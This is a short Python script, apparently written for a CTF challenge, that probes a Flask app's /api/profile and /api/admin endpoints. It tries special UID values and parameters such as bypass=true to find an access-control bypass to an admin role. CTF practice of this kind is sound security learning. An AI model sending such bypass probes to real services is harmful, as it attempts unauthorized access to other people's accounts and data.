import requests
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 尝试特殊值")
print(f"[*] Target: {BASE_URL}")
print()

# 测试1: 尝试用特殊 UID 值
print("[*] 测试1: 尝试特殊 UID 值")

special_uids = [
    "admin",
    "null",
    "undefined",
    "0",
    "1",
    "true",
    "false",
]

for uid in special_uids:
    print(f"    [-] UID: {repr(uid)}")
    
    # 尝试 POST /api/profile
    profile_resp = session.post(f"{BASE_URL}/api/profile", 
        json={"uid": uid},
        headers={"Content-Type": "application/json"})
    print(f"        POST /api/profile: {profile_resp.status_code}")
    if profile_resp.status_code != 400:
        print(f"        [!] Response: {profile_resp.text}")
        
        if '"role":"admin"' in profile_resp.text:
            print(f"        [!!!] 找到管理员!")
            break

print()

# 测试2: 尝试直接 GET /api/admin 带参数
print("[*] 测试2: GET /api/admin 带参数")

params_tests = [
    {"uid": "admin"},
    {"uid": "3553c1effa0b4698895a7cfbd86d8"},
    {"uid": "null"},
    {"bypass": "true"},
]

for params in params_tests:
    resp = session.get(f"{BASE_URL}/api/admin", params=params)
    if resp.status_code != 403:
        print(f"    [+] {params}: {resp.status_code}")
        print(f"    {resp.text[:500]}")

print()

print("[*] 测试完成")
